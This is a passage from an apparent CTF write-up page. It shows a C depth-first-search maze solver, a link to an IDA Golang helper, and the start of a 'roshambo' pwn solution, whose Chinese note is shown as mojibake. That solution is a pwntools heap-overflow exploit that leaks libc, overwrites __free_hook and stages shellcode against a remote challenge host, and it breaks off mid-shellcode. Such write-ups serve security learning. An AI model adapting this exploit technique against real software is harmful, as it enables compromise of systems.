</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#include&lt;string.h&gt;
</span></span><span class=line><span class=cl>#include&lt;stdio.h&gt;
</span></span><span class=line><span class=cl>#include&lt;stdlib.h&gt;
</span></span><span class=line><span class=cl>/*
</span></span><span class=line><span class=cl>a[100][100]
</span></span><span class=line><span class=cl>*/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>void printmap(char a[1000][1000]) {
</span></span><span class=line><span class=cl>    int i, j;
</span></span><span class=line><span class=cl>    for(i = 0;i &lt; 1000;i++) {
</span></span><span class=line><span class=cl>        for(j = 0;j &lt; 1000;j++) {
</span></span><span class=line><span class=cl>            printf(&#34;%hhd&#34;, a[i][j]);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        printf(&#34;\n&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>int dfs(char a[1000][1000], char * answer, int x, int y) {
</span></span><span class=line><span class=cl>    // printmap(a);
</span></span><span class=line><span class=cl>    if(x &gt; 0 &amp;&amp; a[x - 1][y] == 5) {
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;w&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        return 1;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(x &lt; 999 &amp;&amp; a[x + 1][y] == 5) {
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;s&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        return 1;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(y &gt; 0 &amp;&amp; a[x][y - 1] == 5) {
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;a&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        return 1;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(y &lt; 999 &amp;&amp; a[x][y + 1] == 5) {
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;d&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        return 1;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(x &gt; 0 &amp;&amp; a[x - 1][y] == 1) {
</span></span><span class=line><span class=cl>        a[x - 1][y] = 3;
</span></span><span class=line><span class=cl>        a[x][y] = 2;
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;w&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        if(dfs(a, answer, x - 1, y))
</span></span><span class=line><span class=cl>            return 1;
</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(x &lt; 999 &amp;&amp; a[x + 1][y] == 1) {
</span></span><span class=line><span class=cl>        a[x + 1][y] = 3;
</span></span><span class=line><span class=cl>        a[x][y] = 2;
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;s&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        if(dfs(a, answer, x + 1, y))
</span></span><span class=line><span class=cl>            return 1;
</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(y &gt; 0 &amp;&amp; a[x][y - 1] == 1) {
</span></span><span class=line><span class=cl>        a[x][y - 1] = 3;
</span></span><span class=line><span class=cl>        a[x][y] = 2;
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;a&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        if(dfs(a, answer, x, y - 1))
</span></span><span class=line><span class=cl>            return 1;
</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(y &lt; 999 &amp;&amp; a[x][y + 1] == 1) {
</span></span><span class=line><span class=cl>        a[x][y + 1] = 3;
</span></span><span class=line><span class=cl>        a[x][y] = 2;
</span></span><span class=line><span class=cl>        answer[strlen(answer)] = &#39;d&#39;;
</span></span><span class=line><span class=cl>        // puts(answer);
</span></span><span class=line><span class=cl>        if(dfs(a, answer, x, y + 1))
</span></span><span class=line><span class=cl>            return 1;
</span></span><span class=line><span class=cl>        answer[strlen(answer) - 1] = 0;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    return 0 ;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>void find(char a[1000][1000], char * answer) {
</span></span><span class=line><span class=cl>    int i, j;
</span></span><span class=line><span class=cl>    int x, y;
</span></span><span class=line><span class=cl>    for(i = 0;i &lt; 1000;i++) {
</span></span><span class=line><span class=cl>        for(j = 0;j &lt; 1000;j++) {
</span></span><span class=line><span class=cl>            if(a[i][j] == 3) {
</span></span><span class=line><span class=cl>                x = i;
</span></span><span class=line><span class=cl>                y = j;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    // printf(&#34;%d %d\n&#34;, x, y);
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    dfs(a, answer, x, y);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>int main(){
</span></span><span class=line><span class=cl>    char a[1000][1000] = {0};
</span></span><span class=line><span class=cl>    setvbuf(stdin, 0LL, 2, 0LL);
</span></span><span class=line><span class=cl>    setvbuf(stdout, 0LL, 2, 0LL);
</span></span><span class=line><span class=cl>    setvbuf(stderr, 0LL, 2, 0LL);
</span></span><span class=line><span class=cl>    fflush(stdout);
</span></span><span class=line><span class=cl>    fflush(stdin);
</span></span><span class=line><span class=cl>    fflush(stderr);
</span></span><span class=line><span class=cl>    puts(&#34;plz input x:&#34;);
</span></span><span class=line><span class=cl>    int x;
</span></span><span class=line><span class=cl>    scanf(&#34;%d&#34;,&amp;x);
</span></span><span class=line><span class=cl>    int i;
</span></span><span class=line><span class=cl>    int j;
</span></span><span class=line><span class=cl>    for(i=0;i&lt;x;i++){
</span></span><span class=line><span class=cl>        for(j=0;j&lt;x;j++)
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>		    int m=0;
</span></span><span class=line><span class=cl>        	scanf(&#34;%d&#34;,&amp;m);
</span></span><span class=line><span class=cl>        	a[i][j]=m;
</span></span><span class=line><span class=cl>	    }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    char *answer;
</span></span><span class=line><span class=cl>    answer=malloc(0x1000);
</span></span><span class=line><span class=cl>    find(a, answer);
</span></span><span class=line><span class=cl>    printf(&#34;your answer\n&#34;);
</span></span><span class=line><span class=cl>    puts(answer);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return 0;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec>https://github.com/sibears/IDAGolangHelper/tree/b6e7907755bd57f756a157b3cd7565e7ef7a5dec</a></p><h3 id=roshambo>roshambo</h3><p><strong>Second Blood</strong></p><p>2a51&mdash;sha-256
æœ€åæœ‰ä¸ªå †æº¢å‡ºï¼Œmalloc 0çš„æ—¶å€™ä¼šread 0xfffffffff</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#coding=utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>64681</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;81.68.174.63&#39;</span><span class=p>,</span><span class=mi>64681</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>=</span><span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./libc-2.27.so&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;AMD64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>author</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>name</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>name2</span><span class=o>=</span><span class=s1>&#39;b&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Mode: &#39;</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Authorization:&#39;</span><span class=p>,</span><span class=n>author</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your room: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>room</span><span class=o>=</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Name: &#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Your Mode: &#39;</span><span class=p>,</span><span class=s1>&#39;L&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;our room: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>room</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Your Name:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>name2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gd</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#	pause()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>game_start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_free</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content1</span><span class=p>,</span><span class=n>content2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39; &gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; want to say? &#39;</span><span class=p>,</span><span class=n>content2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39; want to say? &#39;</span><span class=p>,</span><span class=n>content1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xc71</span><span class=p>),</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0xc71</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;leave: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7F</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base1</span><span class=o>=</span><span class=n>leak</span><span class=o>-</span><span class=mi>1569</span><span class=o>-</span><span class=mh>0x10</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook1</span> <span class=o>=</span> <span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;LIBC1:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;leave: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=o>=</span><span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x7F</span><span class=s1>&#39;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base2</span><span class=o>=</span><span class=n>leak</span><span class=o>-</span><span class=mi>1569</span><span class=o>-</span><span class=mh>0x10</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook2</span> <span class=o>=</span> <span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s1>&#39;LIBC2:</span><span class=se>\t</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base2</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]),</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>add_free</span><span class=p>(</span><span class=mh>0xF0</span><span class=p>,</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base1</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]),</span><span class=s1>&#39;U&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x51</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base2</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>game_start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>new_execve_env1</span> <span class=o>=</span> <span class=n>free_hook1</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span>
</span></span><span class=line><span class=cl><span class=n>shellcode1</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, </span><span class=si>%d</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov edx, 0x1000
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov eax, 0
</span></span></span><span class=line><span class=cl><span class=s1>syscall
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>jmp rsi
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span> <span class=o>%</span> <span class=n>new_execve_env1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_execve_env2</span> <span class=o>=</span> <span class=n>free_hook2</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span>
</span></span><span class=line><span class=cl><span class=n>shellcode2</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s1>mov rsi, </span><span class=si>%d</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>mov edx, 0x1000
</span></span></span><span class=line><span class=cl><span class=s1>
